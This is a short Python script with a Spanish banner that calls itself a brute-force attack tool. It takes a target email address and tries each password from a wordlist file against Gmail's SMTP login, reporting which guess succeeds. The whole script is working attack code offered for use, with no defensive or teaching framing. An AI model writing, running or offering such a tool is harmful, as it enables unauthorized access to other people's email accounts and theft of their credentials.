
print ("  ____    __                                                                        __   __")
print (" / __ \  / /        __ _   __ __        ___  ___ _  ___  ___ _    __ ___   ____ ___/ /  / /")
print ("/ /_/ / / _ \      /  ' \ / // /       / _ \/ _ `/ (_-< (_-<| |/|/ // _ \ / __// _  /  /_/ ")
print ("\____/ /_//_/     /_/_/_/ \_, /       / .__/\_,_/ /___//___/|__,__/ \___//_/   \_,_/  (_)  ")
print ("                         /___/       /_/                                                   ")
print ("===========================================================================================")
print ("                                    By: Sergio Navarro                                     ")
print ("                            Herramienta para ataques de fuerza bruta                       ")
print ("                             No te rindas hasta lograr tu objetivo                         ")
print ("                                     Buenas vibras siempre                                 ")
print ("===========================================================================================")

import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
print("\n")
email = input("Email: ")
dic = open("./diccionario.txt", "r")
for pwd in dic:
   try:
    smtpserver.login(email, pwd)
    print("Contraseña Correcta: %s"  % pwd)
    break;
   except smtplib.SMTPAuthenticationError:
    print ("Contraseña Incorrecta: %s" % pwd)